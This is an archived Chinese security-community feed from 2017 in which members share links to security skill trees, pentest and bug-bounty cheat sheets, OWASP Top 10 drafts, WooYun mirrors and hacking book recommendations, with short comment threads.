# Miscellaneous
子目录:
- [技能树/Cheat Sheets](#技能树-cheat-sheets)
- [平台](#平台)
- [书籍报告](#书籍报告)
- [APT](#apt)
- [git](#git)
- [Vim](#vim)
- [tmux](#tmux)
- [shell](#shell)
- [端口转发](#端口转发)
- [代理](#代理)
- [crawler](#crawler)
- [验证码](#验证码)
- [Dark Web](#dark-web)
- [AI ML](#ai-ml)
- [Blockchain](#blockchain)
- [IP](#ip)
- [HTML](#html)
- [JS](#js)
- [Docker](#docker)
- [Python](#python)
- [Openwrt](#openwrt)
- [Command and Control](#command-and-control)
- [隐写](#隐写)
- [Browser](#browser)
- [跳转漏洞](#跳转漏洞)
- [证书](#证书)
- [键盘/触摸板](#键盘-触摸板)
- [CPU](#cpu)
- [DLL 注入](#dll-注入)
- [Mail](#mail)

## 技能树 Cheat Sheets

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:

说实话，被大家的信任感动了。创业这条路确实存在很多纠结，安全技能培训也琢磨了很久很久，无论怎样，算踏出了第一步。

作为承上启下，再发下之前我在知道创宇时做的“研发技能表”（目前最新是3.1版本）：

[知道创宇研发技能表v3.1](http://blog.knownsec.com/Knownsec_RD_Checklist/index.html)

大家不妨先看看，看过的可以再看看，我相信还会有全新收获。

这份技能表得到了很多认可与期待，我将带领新团队持续去完善这颗技能树，我们会继承这个并出另一份全新的技能表出来。

我们会在本圈内持续分享围绕这颗技能树相关的技能点。包括但不限于如下：

+ Web 前端 0day 挖掘与利用
+ Web 0day 挖掘与利用
+ IoT 设备(SOHO 路由器) 0day 挖掘与利用
+ 如何征服这个网络空间
+ 黑客手机定制与利用
+ Python 黑客入门到进阶
+ JavaScript 黑客入门到进阶
+ Linux 黑客入门到进阶
+ 渗透测试入门到进阶
+ 内网渗透入门到进阶
+ 研发过程安全入门到进阶
+ 企业如何有效对抗攻击者
+ 无线安全攻防对抗
+ ...

但是需要注意的是：

1. 本圈的分享确实会很“碎片”，这个和培训带来的知识沉淀感觉是有很大距离；
2. 敏感的内容我们会平衡好，忘理解；

本圈会长期存在并持续分享，节奏尽可能做到平均一天至少一分享，所以你的知识沉淀也应该养成长期沉淀的习惯。

一起加油吧！

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-04:


__#公告#__

照顾恐慌者，明天会发布“安全技能树极简版”，敬请关注。😎

...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 要是像猪猪侠的ppt那样，公布技能学习的资源就更赞了！

<img src="https://file.xiaomiquan.com/70/24/7024da54169114c4eb02cf2b02a240c57ec748c432139e0938190f463b5246fa.jpg" width="25px"/> __尘__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: ppt能否给个链接，或传一份？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/70/24/7024da54169114c4eb02cf2b02a240c57ec748c432139e0938190f463b5246fa.jpg" width="25px"/> __尘__: 自己搜下吧，猪猪侠 我的白帽子之路，他微博上也有发

<img src="https://file.xiaomiquan.com/ec/c2/ecc227ca054c7c4a655a2bbd1a676cf38a149b7ef75f7cf351194cbf24b13a27.jpg" width="25px"/> __Ivy__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 并不能找到唉，他的微博叫什么啊

<img src="https://file.xiaomiquan.com/bc/3e/bc3e9334466421eb3f5da3a4f084783617f870995fd3677f152b20e9ce5b1348.jpg" width="25px"/> __远松__ replies to <img src="https://file.xiaomiquan.com/ec/c2/ecc227ca054c7c4a655a2bbd1a676cf38a149b7ef75f7cf351194cbf24b13a27.jpg" width="25px"/> __Ivy__: ringzero  文件是叫“我的白帽学习路线”

<img src="https://file.xiaomiquan.com/bc/3e/bc3e9334466421eb3f5da3a4f084783617f870995fd3677f152b20e9ce5b1348.jpg" width="25px"/> __远松__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 刚看了猪猪侠的ppt，强调的是基础知识，刚好和cos的安全技能树互补👍


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-05:


__#公告#__

 
__#资源#__

安全技能树简版 V1 正式发布

本来是想只出极简版本，想着不过瘾，就出了个简版，不那么复杂，但是内容也比较丰富了。

包括如下 10 大项内容：

+ 说明
+ 高效习惯
+ 正则表达式
+ 数据相关
+ 从脚本到大并发
+ HTTP
+ 各种协议
+ 漏洞测试
+ 渗透测试
+ 防御

本圈的同学可以先睹为快！😏

线上版本：

+ [安全技能树简版](http://evilcos.me/security_skill_tree_basic/index.html)



图片版本：

+ [security_skill_tree_basic.png](http://evilcos.me/security_skill_tree_basic/security_skill_tree_basic.png)



源文件：

+ [security_skill_tree_basic.xmind](http://evilcos.me/security_skill_tree_basic/security_skill_tree_basic.xmind)



+ [security_skill_tree_basic.mm](http://evilcos.me/security_skill_tree_basic/security_skill_tree_basic.mm)



后续本圈的分享会围绕这份安全技能树进行逐一解读，如果你都能掌握好，这个网络世界，还有什么是大问题？

这份简版至少半年不会有大变化，快点跟上吧。



...

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 赞！对比了一下技能树，发现自己过去一年没有白费！
不过在安全方面，原来技能树上的例如XXS和SQLI的测试环境有没有必要补上？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 简版没必要，这里提供的几个漏洞环境其实已经很全面了

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 👌

<img src="https://file.xiaomiquan.com/67/3d/673d53bb43c2bd967a9e6a5f48a7110c99d1e74bf35d7151cd263e7aeb01048d.jpg" width="25px"/> __Lever__: 各个分叉可以并行着折腾吧？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/67/3d/673d53bb43c2bd967a9e6a5f48a7110c99d1e74bf35d7151cd263e7aeb01048d.jpg" width="25px"/> __Lever__: 可以

<img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 请问，硬件方面的iphone +ipad+Mac，主要优势在哪方面

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 效率高、安全、快

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: mac默认可省鼠标一枚。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-09:


__#资源#__

关于这份“黑客成长技术清单”

之前我发布的“安全技能树”里，开头就引入了这个地址，但估计很多人并没认真看。

这两天看到嘶吼的翻译，传播出来了：


[GitHub 万星推荐：黑客成长技术清单 - 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com](http://www.4hou.com/info/news/7061.html)

 

还是中文传播快...

大家会发现，内容实在太多太多，多到恐惧，这么多优秀开源黑客项目及相关资料。

之前我经常说：要相信，当你有一个想法想研发一款牛逼的黑客工具时，这世界一定有人已经在研发，并很可能开源出来了...

这份清单正式如此的感觉，但我还是看到一些优秀的没在上面，这份清单也是在不断更新，包括清单的运营团队（@HackwithGithub）每天在推上都有动态，前段时间，我开源的 XSS'OR 他们也推过。

推和 GitHub 里的黑客交流氛围真的很浓厚，国内这块也不用感慨路还很远，国内不必重新再造轮子，参与进国外这些氛围里是最直接的方式，英语和墙的门槛，对我们来说根本不是阻碍。

还好，GitHub 还能如此顺畅。

清单原地址：


[GitHub - Hack-with-Github/Awesome-Hacking: A collection of various awesome lists for hackers, pentesters and security researchers](https://github.com/Hack-with-Github/Awesome-Hacking)


---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-30:


__#资源#__

web安全学习中文资料

在微博，"蚁工厂"工厂上，看到一个不错的web安全学习中文资料，看了下，收集的挺不错的。搞web安全的同学遍历一下吧。

Web-Security-Learning，关于web安全的资料收集。中文资料。

包括SQL注入、前端安全XSS、CSRF、SSRF、XXE、JSONP注入，还有各种序列化漏洞、资料收集、渗透测试等等等等。

[GitHub - CHYbeta/Web-Security-Learning: Web-Securi...](https://github.com/CHYbeta/Web-Security-Learning)



<img src="https://images.xiaomiquan.com/Fu2m7AzyLbHKx8cw72815O-JRwQv?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:zNWisirBB1u1vm6pXQaEeMk8b1g=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FiFhtu0qZ6MRaakyWGrVi5BnZJyI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:qPh_ZE_ce9kcjA2Zt5GGQ3W0SGs=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FhnmTcjzQTbiRXWcz5CRKr8YLL_0?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:DtM3j_vNEsVSDzlEjBeEr-rqEqM=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FiiztpuGB-SRmMdFFa_SYzJgYx9o?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:5PqPDRedj3XMiK1-NJuSXnoVp84=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-22:


__#资源#__

Awesome Pentest Cheat Sheets

极好的渗透测试清单。嗯，这个老外汇总整理了不少精彩的 Cheat Sheets，确实很有用。

发现我开源的 XSS’OR 也在其中，很好很好，等着下一版本我的大升级，绝对不仅仅是加解密优秀啊...

细节见：


[GitHub - coreb1t/awesome-pentest-cheat-sheets: Col...](https://github.com/coreb1t/awesome-pentest-cheat-sheets)


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-29:


__#资源#__

漏洞赏金技能清单

GitHub 真是个黑客氛围浓厚的地方，这个也有人整理出来了，过了一遍，虽然还很不够全面，算挺难得的了，分享给大家。

这份技能清单，包括：

+ 那些赏金平台
+ 相关书籍
+ 特殊的工具
+ 情报调研
+ XSS 清单
+ SQL 注入清单
+ SSRF 清单
+ CRLF 注入清单
+ CSV 注入清单
+ LFI 清单
X+ XE 清单
+ RCE 清单
+ 重定向漏洞清单
+ 加密清单
+ 模版注入清单
+ 内容注入清单
+ XSLT 注入清单

具体见：


[GitHub - EdOverflow/bugbounty-cheatsheet: A list o...](https://github.com/EdOverflow/bugbounty-cheatsheet)



有精力者完全可以去这些赏金平台上刷点知名度、经验和美金...



...

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 老大  这是技能表么相当于

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 赏金猎人入门级技能表


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-30:


__#资源#__

Web 安全学习资料

Chybeta 同学很认真，汇总的学习资料很多了，转这分享给大家：


[Web-Security-Learning | Chybeta](https://chybeta.github.io/2017/08/19/Web-Security-Learning/)



---

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-19:


__#在线技能树#__

 
漏洞银行的在线技能树，里面的wiki都是小伙伴们分享的，这个不像cos的技能树，这个就是我这种懒人专用:)QAQ，想知道什么就去翻，大部分是常用的wiki，，没事就去翻翻,目前只有web的。里面的东西一直都在持续更新。

[漏洞银行(BUGBANK) 官方网站 | 全球漏洞悬赏平台](https://skills.bugbank.cn/)



<img src="https://file.xiaomiquan.com/99/16/99162d649073e7859d8dd38f48c4a12d1d692b1f4bacd7853ccc5f34c47e649e.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/44/3b/443b7f67fe65375a441d097c8af38fc34f4c994a9b0ef7453481d8c6b6af536a_big.jpg" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-05:


__#讨论#__

  OWASP TOP 10 2017 都应该有什么

我还以为之前我有在本圈有发过 OWASP 今年的新标准草案，原来只发了朋友圈...

4月份出的是 RC1，最近出的是 RC2，都还不是正式版。单从 RC1 与 RC2 两版本就可以看出：争议不小，但官方会修正。

来看看 RC1 和 RC2 都有什么（图1与2），其中 RC1 的 A7 当时被抨击是“买个防火墙了事”，在 RC2 已经去掉，RC2 变化还是挺大的，新增的也比较吻合我的说法（之前本圈发过新 Web 安全都有哪些内容的观点），不过既然 XXE 和反序列化都单独列出来了，SSRF 放哪呢？

RC2 的 A10“不足的日志记录和监控”和 RC1 的 A7 有点类似，不过好多了，也对味我朝的等保和网络安全法要求。

关于 RC1 RC2 的中文翻译细节可以见：

[2017 OWASP TOP 10 — OWASP-CHINA](http://www.owasp.org.cn/owasp-project/2017-owasp-top-10)



你有什么看法，欢迎讨论。


<img src="https://file.xiaomiquan.com/18d/f8/8df80a39ed0b95be1e4b8f63634453f0eb15f6fb3a123481f66da87d9b1908e0.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/1e3/bb/e3bb37021c6352cabd83fa54f0ca25d361e82d39d7f45d94fa51ad0da4bd0dfc.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 我靠，CSRF没了我都没注意到！这 RC2 绝不会成为正式版！

<img src="https://file.xiaomiquan.com/0b/d5/0bd53bc4b18227b7562165b12e018c1c9694de48899eab882ff4b81c475e6b73.jpg" width="25px"/> __souleater__: 我也觉得😂当初我看没了都吓一跳，难道已经有彻底解决了CSRF

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 2003版中A10-未验证的重定向 指的就是前面分享的那个uber dom   xss吗

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 有关系

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: RC2 已经是正式版了...


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-18:


__#姿势#__

  适合新手的 Hacking 入门系列文章


[Null Byte — The aspiring white-hat hacker/security...](https://null-byte.wonderhowto.com)



WANDER HOW TO 的 NULL BYTE 是一系列入门文章教你各种 Hacking 技巧的，很多其实都赶上了时代。我早期就订阅了其 RSS，看了不少，有时对我来说也是个阅读享受。

全英文，但很简单很简单。


<img src="https://file.xiaomiquan.com/12b/3f/2b3f6056bb4d6b67039a42716395525fdda8458477615158178200bb53571774.jpg" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-30:


__#资源#__

 漏洞挖掘的高级手法

推荐下面这篇。对于漏洞挖掘初学者来说，看这篇会觉得很爽:) 知识面+漏洞认知+工具+耐心 -> 一个个好洞。


[High-Level Approaches for Finding Vulnerabilities ...](http://jackson.thuraisamy.me/finding-vulnerabilities.html)




<img src="https://file.xiaomiquan.com/1cb/6e/cb6ed20e5f8e3431d978ae2b2e71fdc176000f5c4340f0f3019c4344bf217305.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/185/67/8567536525baf23df67b8495561f5ac7b1d8c1afbba896b199b379f2aedefc2c.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/138/bf/38bf710867aebf1f8f04fc87a61677b0a00cb0732e4b09c064220fb30893ed78.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/164/c9/64c922676a00d4f010b2495964ae87b1e9a413c9abe1a53cc1fb5b00cbcfb07a.png" width="50%" height="50%" align="middle"/>


---

<img src="https://file.zsxq.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st@信安之路__ on 2017-12-09:


__#经验#__  

什么是渗透测试？


[The Penetration Testing Execution Standard](http://www.pentest-standard.org/)


这个网站描述的是最为详细的了(这个网站我还没看完 只看了部分 看完了会好好介绍一下的) 概括起来就是七部分

但这七个部分的作用却有点类似于 OSI 模型一样,只是一个标准,就国内而言,我看到的很多,是简之又简的

看到的算是比较全面的知道创宇的算一个


[渗透测试_漏洞检测_网站安全检测_网站漏洞修复 - 知道创宇安全服务](http://scanv.com/stcs/)


我记得之前还看到过其他的也是做的挺好的，但是忘记 mark 下网站了，有空我看看历史纪录，补充一下。


[这是一篇技术文](http://mp.weixin.qq.com/s/bJtlUhkbodRfQ46GgM6wPQ)


...

<img src="https://file.zsxq.com/a5/c5/a5c55f12eac59f3fad216a0b8016e5acaa88e86bc8477f0203f8402337a82f65.jpg" width="25px"/> __掉到鱼缸里的猫__: 这个在余大推荐的《黑客秘笈》里有～很棒的入门书

...

---



## 平台


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-20:

> 匿名用户 提问：
弦大，我想问一下，现在还有类似于乌云那样的网站么，国内国外都行


国外可以看 HackerOne，国内暂无此辉煌。


---

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-07-20:

乌云没有倒下一直都在！ 比较好点网速的的3个站,根据类型漏洞一个个过还是很刺激的，come 

[乌云社区](http://zone.secbug.net/zone/index.html)


[乌云Wiki](http://wiki.secbug.net/)


[乌云漏洞平台+drops](http://wooyun.chamd5.org)


...

<img src="https://file.xiaomiquan.com/78/e9/78e9ff588e637881e951e6a67a256e8fae0f2bd3cbe34dda75f5839f21405851.jpg" width="25px"/> __吕土金__: 怎么注册乌云？需要先提交漏洞吗？

<img src="https://file.xiaomiquan.com/60/b2/60b27269be5db4df43edc134493a7c84fcd2f5e0ee402c8120ef0c5d2b0969d9.jpg" width="25px"/> __leshack__: 怎么注册呢

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__: 如何登录啊

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这些都是镜像，没什么注册不注册的

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有些帖子必须登陆有啥方法绕过么，是只能遍历那个数字？

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-10:

> 签到啦 提问：
我入圈几天，微博关注您有段时间了。您有条微博写道：“黑客的自由地：GitHub、Twitter、等、等等、等等等 ”，后面的“等”是指代那三个“地”？如果不是，请推荐几个好“地”。


比如：Telegram 频道，如我之前创建的“灰袍推送”：

[https://t.me/greyrobe](https://t.me/greyrobe)



另外一个是：暗网世界，这个就不用公开提了。



---



## 书籍报告



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#资源#__

2017年，Web 后端出现了哪些新的思想和技术？推荐这篇回答：


[2017年，Web 后端出现了哪些新的思想和技术？ - 知乎](https://www.zhihu.com/question/61085805/answer/186718190)

 

一位我一直觉得功力深厚的工程师好友。他这种底子如果想搞安全，那简直不敢想象的黑。😄

大家看他的回答，不懂的词汇可以自己搜索，算是了解下在优秀工程师眼里，Web 后端的门门道道吧，对我们搞安全的人来说，知己知彼，你懂得。


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-25:


__#资源#__

  好书推荐之《黑客秘笈——渗透测试实用指南（第2版）》

第一版刚出我就过了一遍，然后做了推荐，第二版内容更多更新，同样很推荐。

无论是玩渗透，组红队，打 CTF，都可以看这本书，方方面面作为渗透的入门还是不错的。

包括：相关渗透环境的搭建、情报收集、漏扫、漏洞利用、Web 渗透、内网渗透、社会工程学、物理攻击、免杀、破解、绕过、相关资源。

哈哈，这其实也像我的那个安全技能树（我的偏工程化），如果真的认真研读我分享的技能树，我想你应该会真的开窍。

成为实战派吧！JUST DO IT!

<img src="https://images.xiaomiquan.com/Fs_3rlL9MCZfd30lMh2oL3aXbmp5?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:0fnfUSVDLRtsgQYn6leiAgknHso=" width="50%" height="50%" align="middle"/>

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-27:


__#资源#__

 重磅推荐，黑客报告 2017！

这篇报告从茄牛的分享里看到的，这里也推荐给大家，这篇报告确实是一份难得的“非常规网络安全报告”，攻击者视角与防御者视角做得不错，很多数字与观点值得深入琢磨。

无论你是攻还是防，这篇报告都值得你的仔细阅读。

感谢输出报告的公司及译者公司。

<img src="https://images.xiaomiquan.com/FgWUyrsgx_9Me4CYYslj2uRGgimF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:fIObhRh0Ldvo2ozk3aWsOyTDZOw=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FnOoKbrDQwci7KLouKcprUjZVhzx?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PUjWb19auwxE-ijNLmb8atqNK7w=" width="50%" height="50%" align="middle"/>

__分享文件:__

[黑客报告2017.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/黑客报告2017.pdf)


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-05:


__#经验#__

给大家分享篇老文《用追MM来解释23种设计模式》


[http://www.jianshu.com/p/84f19e25aeac](http://www.jianshu.com/p/84f19e25aeac)

 

为什么分享这个呢？当年我刚接触编程时，设计模式这玩意理解了很久，一直很模糊，毕竟当时没什么实战经验，后来看到这篇文章...作者这科普膜拜得不行啊。

之前经验分享说过，玩安全一定要玩好编程。那现在再补上一句：玩好编程，一定要理解透各种设计模式。

设计模式不是只有这些，至于为什么，你以后会知道的。😏



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 推荐一本书，大话设计模式

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 推荐一种编程方式，天生就自带设计模式，他就是函数编程

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 这种方式很赞很赞

<img src="https://file.xiaomiquan.com/2b/f9/2bf9e6206c897d781f31230a6f9923b346da1a247d2a1822470bf25995a3659f.jpg" width="25px"/> __winlans__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 我感觉设计模式之蝉更好点或许

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 弦哥，有研究s2-048吗

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 意义不大


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-11:


__#资源#__

C# 灰帽，非常期待此书！嗯，中文版不知道国内何时译出。

<img src="https://images.xiaomiquan.com/FphB0x6GKSB1hzrg6pb_DS8Ac3o-?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:gfy5VHMUm-Pte676xFpazaVkcN0=" width="50%" height="50%" align="middle"/>


...

